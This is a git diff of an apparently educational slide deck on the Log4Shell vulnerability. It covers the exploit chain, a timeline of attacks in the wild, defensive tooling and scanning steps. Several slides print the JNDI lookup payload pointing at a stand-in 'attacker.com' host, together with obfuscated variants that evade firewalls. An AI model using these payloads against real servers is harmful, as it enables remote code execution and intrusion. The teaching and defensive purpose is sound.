@@ -28,6 +28,7 @@
 					<li class="fragment">How does Log4Shell work 🤔</li>
 					<li class="fragment">Hacking a vulnerable Minecraft server 🖥️</li>
 					<li class="fragment">How is Log4Shell exploited in the wild? 🌳</li>
+					<li class="fragment">How can I protect myself? 🛡️</li>
 					<li class="fragment">How I was attacked 😱</li>
 				</ul>
 			</section>
@@ -43,7 +44,7 @@
 				<h2>Log4Shell</h2>
 				<span class="fragment">A.K.A. CVE-2021-44228</span>
 				<span class="fragment">, CVE-2021-45046, CVE-2021-45105 and CVE-2021-44832</span>
-				
+
 				<img src="assets/img/log4shell-cve.png" width="900" class="fragment">
 			</section>
 			<section>
@@ -63,20 +64,21 @@
 			<section>
 				<h2>How can this be abused?</h2>
 
-				
+
 				<div class="r-stack">
 					<ol>
-						<li class="fragment">JNDI lookup payload is placed in logs <pre><code data-trim data-noescape>${jndi:ldap://attacker.com/exploit}</code></pre></li>
+						<li class="fragment">JNDI lookup payload is placed in logs
+							<pre><code data-trim data-noescape>${jndi:ldap://attacker.com/exploit}</code></pre>
+						</li>
 						<li class="fragment">Log4J contacts the LDAP server for information</li>
-						<li class="fragment">LDAP server redirects Log4J to an HTTP server which hosts a Java class file</li>
+						<li class="fragment">LDAP server redirects Log4J to an HTTP server which hosts a Java class file
+						</li>
 						<li class="fragment">Content of the class file is downloaded and executed</li>
 					</ol>
 					<img class="fragment" src="assets/img/explotion.gif" width="800">
 				</div>
 			</section>
-			<section>
-				<img src="assets/img/meme3.jpeg" class="r-stretch">
-			</section>
+
 			<section data-background-image="assets/img/hackerman.jpeg">
 				<h2>Hacking a vulnerable Minecraft server 🖥️</h2>
 			</section>
@@ -137,63 +139,217 @@
 				<video controls class="r-stretch" src="assets/video/hack.mp4"></video>
 			</section>
 
-			<section data-background-video="assets/video/hackerman1.mp4" 
-			data-background-video-loop data-background-video-muted>
+			<section data-background-video="assets/video/hackerman1.mp4" data-background-video-loop
+				data-background-video-muted>
 			</section>
 
 			<section>
 				<h2>How is Log4Shell exploited in the wild? 🌳</h2>
 
-				<small>And why is the Internet still working?</small>
+				<small>And what has happened in the last 3 Months?</small>
 			</section>
 
 			<section>
-				<h2>Current State: <br>Not as bad as feared</h2>
-				<small class="fragment">...yet</small>
+				<h2>Current State</h2>
+				<small>Interest has died down <br> and attacks have become background noise</small>
+
+				<img src="assets/img/google-trends.png">
 			</section>
 
 			<section>
-				<img src="assets/img/CISO-report.png">
-				<small>therecord.media - 10.01.2022</small>
-			</section>
-
-			<section>
-				<h2>Automated exploitation in progress</h2>
+				<h2>First days: Automated exploitation</h2>
 				<img class="r-stretch" src="assets/img/greynoise.png">
 				<small>greynoise.io - With Log4J RCE Attempt filter</small>
 			</section>
 
 			<section>
-				<h2>VMWare Horizon Campaign</h2>
-				<img src="assets/img/vmware-horizon.png" alt="">
-				<small>Large scale Campaign targeting unpatched internet facing VMWare Horizon installations - 11.01.2022</small>
+				<h2>January - The VMWare Horizon Incident</h2>
+				<img src="assets/img/vmware-horizon.png">
 			</section>
 
 			<section>
-				<img src="assets/img/ransom-note.jpg" alt="">
-				<small>Night Sky ransom note</small>
+				<h2>January - The VMWare Horizon Incident</h2>
+				<ul>
+					<li class="fragment">Virtual desktop server</li>
+					<li class="fragment">Shodan: 25k accessible installations on the internet</li>
+					<li class="fragment">First targeted attack on product with a wide installation base</li>
+					<li class="fragment">Patching is not trivial</li>
+					<li class="fragment">Continued discovered vulnerabilities found in Log4j, led to that patches had to
+						be applied multiple times</li>
+				</ul>
 			</section>
 
 			<section>
-				<img src="assets/img/but-why-meme.jpeg" width=800>
-				<p>Some Theories</p>
+				<h2>January - Sophos' blog post</h2>
+				<img src="assets/img/sophos-blog-post.png">
 			</section>
 
 			<section>
-				<h2>Theory 1</h2>
-				<p>Bad guys can't code java 🔥</p>
-				<img src="assets/img/patrick-grey.jpeg" alt="">
-				<small>Patrick Grey - Host of the Risky Business podcast</small>
+				<h2>January - Sophos' blog post</h2>
+				<ul>
+					<li class="fragment">Log4Shell will be targeted for years to come</li>
+					<li class="fragment">Mass exploitation was prevented by widespread media coverage. Similar to Y2K
+					</li>
+					<li class="fragment">In the first few days of the attack, mainly cryptominers were installed</li>
+					<li class="fragment">Worried that patched systems still contain backdoors</li>
+					<li class="fragment">Will internal applications ever be patched? Great target for lateral movement
+					</li>
+				</ul>
 			</section>
 
 			<section>
-				<h2>Theory 2</h2>
-				<p>Log processing can be unpredictable in enterprise apps</p>
+				<h2>February - Google Cloud stats</h2>
+				<img src="assets/img/google-cloud-stats.png">
 			</section>
 
 			<section>
-				<h2>Theory 3</h2>
-				<p>Attackers wait to use the compromised machines when attention wanders off</p>
+				<h2>February - Google Cloud stats</h2>
+				<ul>
+					<li class="fragment">400k scans per day on google cloud servers</li>
+					<li class="fragment">Scans are now just background noise</li>
+					<li class="fragment">Sooner or later all vulnerable systems on the internet will be breached</li>
+					<li class="fragment">More systemic attacks than in the first few days</li>
+					<li class="fragment">Continued attacks as long as exploitation is easy and vulnerable systems are
+						found</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Cat and mouse game</h2>
+				<small>WAF maintainers vs attackers</small>
+
+				<ul>
+					<li class="fragment">JNDI payload can easily be obfuscated</li>
+					<pre class="fragment"><code data-trim data-noescape>${jndi:ldap://attacker.com/exploit}</code></pre>
+					<pre
+						class="fragment"><code data-trim data-noescape>${jndi:${lower:l}${lower:d}${lower:a}${lower:p}}://attacker.com/exploit}</code></pre>
+					<pre
+						class="fragment"><code data-trim data-noescape>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}}://attacker.com/exploit}</code></pre>
+					<li class="fragment">Many thousands of iterations.</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>March - The Qualis platform study</h2>
+				<img src="assets/img/qualys-platform-study.png">
+			</section>
+
+			<section>
+				<h2>March - The Qualis platform study</h2>
+				<ul>
+					<li class="fragment">In December Qualis detected 3 Million vulnerable applications on the internet
+					</li>
+					<li class="fragment">In March 30% of applications remain unpatched</li>
+					<li class="fragment">Since January attacks trend down but are still ongoing</li>
+					<li class="fragment">Vulnerable Log4J versions keep getting downloaded</li>
+					<li class="fragment">End of life dependencies which use vulnerable Log4J under the hood are also
+						still used</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>March - Immersive labs study on cyber thread readiness</h2>
+				<img src="assets/img/immersive-labs-study.png">
+			</section>
+
+			<section>
+				<h2>March - Immersive labs study on cyber thread readiness</h2>
+				<ul>
+					<li class="fragment">They offer cybersecurity training</li>
+					<li class="fragment">On average it takes organizations 65 days to complete trainings on new threats
+					</li>
+					<li class="fragment">The Log4Shell trainings were completed within days</li>
+					<li class="fragment">High attention on vulnerability lead to quick education and fast remidiation
+					</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Did we avoid the big bang?</h2>
+				<img class="r-stretch" src="assets/img/rdj-relief.gif">
+
+				<aside class="notes">
+					<ul>
+						<li>Too early to tell</li>
+						<li>Cyberattack campaigns take weeks to months</li>
+						<li>between initial breach, lateral movement and exfiltration</li>
+						<li>care needs to be taken</li>
+					</ul>
+				</aside>
+			</section>
+
+			<section>
+				<h2>How can I protect myself? 🛡️</h2>
+			</section>
+
+			<section>
+				<h2>What you should have done by now</h2>
+				<ul>
+					<li class="fragment">Check if your project has a vulnerable version of Log4J</li>
+					<li class="fragment">Make sure that you don't include vulnerable Log4J versions in the future</li>
+					<li class="fragment">Be aware what dependencies your project has</li>
+					<li class="fragment">Limit the number of dependencies in your project</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>What tooling exists?</h2>
+				<p>3 classes of tooling</p>
+				<ul>
+					<li class="fragment">Pentest your own service for Log4Shell</li>
+					<li class="fragment">Scan your Java Dependencies for vulnerable Log4J versions</li>
+					<li class="fragment">General Vulnerability Scanners</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Pentest yourself</h2>
+				<pre class="fragment"><code data-trim data-noescape data-line-numbers="1-10|5">
+					git clone https://github.com/adilsoybali/Log4j-RCE-Scanner.git
+					cd Log4j-RCE-Scanner
+					chmod +x log4j-rce-scanner.sh
+					./log4j-rce-scanner.sh -h
+				</code></pre>
+				<p class="fragment">Tries to inject ldap payloads in various headers and parameters</p>
+			</section>
+
+			<section>
+				<h2>Scan your java dependencies</h2>
+				<pre class="fragment"><code data-trim data-noescape>
+					mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core
+				</code></pre>
+				<img class="fragment" src="/assets/img/maven-log4j-scan.png" alt="">
+			</section>
+
+			<section>
+				<h2>Whitesource</h2>
+				<ul>
+					<li class="fragment">Used heavily in BCI</li>
+					<li class="fragment">Scans all your dependencies for known vulnerabilities</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>OCAAS</h2>
+				<small>Open source compliance as a service</small>
+				<ul>
+					<li class="fragment">Platform offered by Bosch.IO</li>
+					<li class="fragment">Dependency vulnerability scan and much more</li>
+					<li class="fragment">Consulting available</li>
+					<li class="fragment">Experience with a lot of different code stacks</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Open source supply chain attacks</h2>
+				<ul>
+					<li class="fragment">Popular targets because of a broad installation base</li>
+					<li class="fragment">Different attack vectors: Find vulnerabilities or infiltration of the supply
+						chain</li>
+					<li class="fragment">Many open source projects are underfunded</li>
+					<li class="fragment">Often obscure features are not turned off by default</li>
+					<li class="fragment">Companies who profit from open source should give back</li>
+				</ul>
 			</section>
 
 			<section>
@@ -225,7 +381,7 @@
 					<img class="fragment" src="assets/img/yes.gif" alt="">
 				</div>
 			</section>
-			
+
 			<section>
 				<h2>Looking at the logs</h2>
 				<pre><code data-trim data-noescape>
@@ -304,7 +460,7 @@ echo done
 			<section>
 				<h2>strings</h2>
 				<img src="assets/img/go-project.png" alt="">
-				<small>Binary was generated from go</small>
+				<small>Binary was compiled from go</small>
 			</section>
 
 			<section>
@@ -366,19 +522,65 @@ echo done
 				<ul>
 					<li><a href="https://en.wikipedia.org/wiki/Log4Shell">en.wikipedia.org/wiki/Log4Shell</a></li>
 					<li><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4J lookups</a></li>
-					<li><a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">JNDI architecture</a></li>
+					<li><a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">JNDI architecture</a>
+					</li>
 					<li><a href="https://tryhackme.com/room/solar">Tryhackme exploit walkthrough</a></li>
-					<li><a href="https://www.youtube.com/watch?v=7qoPDq41xhQ">John Hammond Log4Shell explanation</a></li>
+					<li><a href="https://www.youtube.com/watch?v=7qoPDq41xhQ">John Hammond Log4Shell explanation</a>
+					</li>
 					<li><a href="https://github.com/mbechler/marshalsec">LDAP referer</a></li>
-					<li><a href="https://therecord.media/cisa-director-log4shell-has-not-resulted-in-significant-government-intrusions-yet/">CISA Report</a></li>
-					<li><a href="https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22">greynoise.io Log4J attacks</a></li>
-					<li><a href="https://risky.biz/">Risky.biz information security podcast</a></li>
-					<li><a href="https://www.cyberscoop.com/chinese-hackers-log4j-night-sky-ransomware-microsoft/">VMWare Horizon ransomware campaign</a></li>
+					<li><a href="https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22">greynoise.io
+							Log4J attacks</a></li>
+					<li><a
+							href="https://samagame.com/blog/en/review-log4j-attackers-continue-to-target-vmware-horizon-servers/">VMWare
+							Horizon 1</a></li>
+					<li><a
+							href="https://therecord.media/uk-nhs-threat-actor-targets-vmware-horizon-servers-using-log4shell-exploits/">VMWare
+							Horizon 2</a></li>
+					<li><a href="https://kb.vmware.com/s/article/87073">VMWare Horizon 3</a></li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Sources 2</h2>
+
+				<ul>
+					<li><a
+							href="https://news.sophos.com/en-us/2022/01/24/log4shell-no-mass-abuse-but-no-respite-what-happened/">Sophos
+							blog post</a></li>
+					<li><a href="https://www.cyberscoop.com/google-cloud-log4shell-log4j-threat-horizons/">Google Cloud
+							stats 1</a></li>
+					<li><a href="https://services.google.com/fh/files/misc/gcat_threathorizons_full_feb2022.pdf">Google
+							Cloud stats 2</a></li>
+					<li><a href="https://www.helpnetsecurity.com/2022/03/21/qualys-platform-study-log4shell/">Qualis
+							Platform study</a></li>
+					<li><a
+							href="https://www.immersivelabs.com/resources/blog/strengthening-cybersecurity-teams-capabilities-cyber-workforce-benchmark-2022/">Immersive
+							Labs study</a></li>
+					<li><a href="https://github.com/Forescout/log4j_response">Payload obfuscation</a></li>
+					<li><a href="https://cloud7.news/how-tos/log4j-log4shell-vulnerability-scanner/">URL scanners</a>
+					</li>
+					<li><a href="https://dzone.com/articles/checking-java-project-dependency-on-log4j-vulnerability">Java
+							dependency scanners</a></li>
+					<li><a href="https://www.whitesourcesoftware.com/">Whitesource</a></li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>Sources 3</h2>
+
+				<ul>
+					<li><a
+							href="https://inside-docupedia.bosch.com/confluence/display/IOCPortfolio/Open+Source+Management+Infrastructure+Toolchain">OCAAS</a>
+					</li>
+					<li><a href="https://devops.com/secure-software-summit-the-state-of-oss-supply-chain-security/">OSS
+							supply chain security</a></li>
 					<li><a href="https://github.com/Adikso/minecraft-log4j-honeypot">Minecraft Honeypot</a></li>
 					<li><a href="https://github.com/Fahrj/reverse-ssh">ReverseSSH</a></li>
 					<li><a href="https://www.abuseipdb.com">AbuseIPDB - check suspicious ips</a></li>
 					<li><a href="https://blog.bithole.dev/log4shell-mc.html">Bithole article</a></li>
-					<li><a href="https://www.reddit.com/r/admincraft/comments/s1xqp3/identifying_potential_exposure_following_log4j/">Reddit Threat</a></li>
+					<li><a
+							href="https://www.reddit.com/r/admincraft/comments/s1xqp3/identifying_potential_exposure_following_log4j/">Reddit
+							Threat</a></li>
 				</ul>
 			</section>
 
@@ -387,7 +589,7 @@ echo done
 				<img src="assets/img/qr.gif" alt="" width="300">
 				<p>https://github.com/nixrod/log4shell-presentation</p>
 			</section>
-		
+
 
 		</div>
 	</div>
